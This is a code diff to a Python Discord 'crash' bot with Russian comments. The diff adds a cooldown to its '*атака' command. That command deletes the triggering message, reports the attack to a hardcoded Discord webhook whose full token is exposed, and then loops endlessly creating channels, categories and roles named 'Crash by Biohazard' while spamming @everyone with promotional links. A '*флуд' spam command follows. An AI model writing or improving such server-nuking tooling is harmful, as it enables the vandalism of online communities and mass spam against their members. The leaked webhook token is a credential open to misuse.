@@ -6,12 +6,14 @@ import re
 token = os.environ.get('TOKENZ') #токен
 from discord_webhook import DiscordWebhook
 print('Ожидание входа...')
+cooldown = 0
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.5'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.6'))
 		
 	async def on_message(self, message):
+		global cooldown
 		c = 0
 		r = 0
 		m = 0
@@ -127,9 +129,11 @@ class MyClient(discord.Client):
 					f.write(text)
 					f.truncate()
 				await message.author.send(':white_check_mark:')
-		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
+		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1 and cooldown != 1:
 			if message.content == '*атака': #автоматический краш
+				cooldown = 1
 				await message.delete() #удаление сообщения
+				await message.author.send('Команда будет доступна через 5 минут [для всех]')
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
 				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
@@ -172,12 +176,15 @@ class MyClient(discord.Client):
 				await asyncio.sleep(0.1)
 				try:
 					while True:
-						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_category('Crash by Biohazard') #создание категории
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
 				except:
 					pass
+				
+				time.sleep(300)
 				
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'
